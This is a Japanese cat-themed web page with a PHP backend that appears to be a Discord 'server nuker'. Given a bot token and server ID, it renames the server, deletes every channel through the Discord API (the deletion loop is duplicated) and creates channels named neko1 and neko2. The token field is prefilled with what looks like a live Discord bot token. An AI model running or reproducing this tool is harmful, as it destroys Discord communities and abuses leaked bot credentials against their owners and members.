<!DOCTYPE html>
<html lang="ja">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta http-equiv="content-type" charset="UTF-8">
    
    <title>おにゃんこ</title>
   <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
  
  <div class="bg-white py-6 sm:py-8 lg:py-12">
  <div class="mx-auto max-w-screen-2xl px-4 md:px-8">
    <a href="" class="inline-flex items-center gap-2.5 text-2xl font-bold text-black md:text-3xl" aria-label="logo">
            <img  class="h-10 w-10 text-indigo-500" fill="currentColor" src="http://nya.cloudfree.jp/cccp/2.jpeg" style="border-radius:50%;"></img>
    CCCP
    </a>
    <div class="text-center"><p class="text-4xl ...　">おにゃんこ！！！&#128574;</p></div>
    <form id="botForm" method="post">
      
      <div class="sm:col-span-2">
        <label for="token" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">BOTトゥークン</label>
 <input type="text"value="MTI1MTc3MDMzMTcwMjYyNDMyOA.Gn8Q-c.KaPu0otiLkW23BWwj_FCo5lBrKIeaG49ABo_2w" id="token"name="token"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="serverId" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Server ID</label>
        <input type="text"id="serverId"name="serverId"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="serverName" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Server NAME</label>
        <input type="text"id="serverName"name="serverName"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="message" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Message</label>
        <textarea name="message" class="h-64 w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring"></textarea>
      </div>
    
      <div class="flex items-center justify-between sm:col-span-2">
        <button type="submit"class="inline-block rounded-lg bg-red-500 px-8 py-3 text-center text-sm font-semibold text-white outline-none ring-red-300 transition duration-100 hover:bg-red-600 focus-visible:ring active:bg-red-700 md:text-base">FIREEEEEEEEEEEEEEEEEEEEEEEEEEEEE</button>
      </div>
    </form>
    <br>
    <div class="flex divide-x rounded-lg border bg-gray-50">
      <div class="flex items-center p-2 text-indigo-500 md:p-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 md:h-8 md:w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
        </svg>
      </div>

      <div class="p-4 md:p-6">
        <h3 class="mb-2 text-lg font-semibold md:text-xl">SIMPLE AND NYANKO&#128574;</h3>
        <p class="text-gray-500">安全で低速、簡単なツールができたニャ</p>
      </div>
    </div>
</body>
</html>

<?php
require 'vendor/autoload.php';
use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;
use GuzzleHttp\Promise\Utils; // 追加

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // フォームからの入力を取得
    $token = $_POST['token'];
    $serverId = $_POST['serverId'];
    $serverName = $_POST['serverName'];
    $message = $_POST['message'];

    $client = new Client([
        'base_uri' => 'https://discord.com/api/',
        'headers' => [
            'Authorization' => 'Bot ' . $token,
            'Content-Type' => 'application/json'
        ]
    ]);

    try {
        // サーバー名を変更
        $client->patch("guilds/{$serverId}", [
            'json' => [
                'name' => $serverName
            ]
        ]);

        // サーバー内の全チャンネルを取得
        $response = $client->get("guilds/{$serverId}/channels");
        $channels = json_decode($response->getBody(), true);

        // 非同期でチャンネルを削除
        $promises = [];
        foreach ($channels as $channel) {
            $promises[] = $client->deleteAsync("channels/{$channel['id']}");
        }
        Utils::settle($promises)->wait(); // 修正

foreach ($channels as $channel) {
            $promises[] = $client->deleteAsync("channels/{$channel['id']}");
        }
        Utils::settle($promises)->wait(); // 修正

        // 新しいチャンネルを作成
        $newChannels = [];
        for ($i = 0; $i < 2; $i++) {
            $response = $client->post("guilds/{$serverId}/channels", [
                'json' => [
                    'name' => 'neko' . ($i + 1),
                    'type' => 0
                ]
            ]);

            $newChannel = json_decode($response->getBody(), true);
            $newChannels[] = $newChannel['id'];
        }

    } catch (RequestException $e) {
        echo 'エラー: ' . $e->getMessage();
    }
}
?>

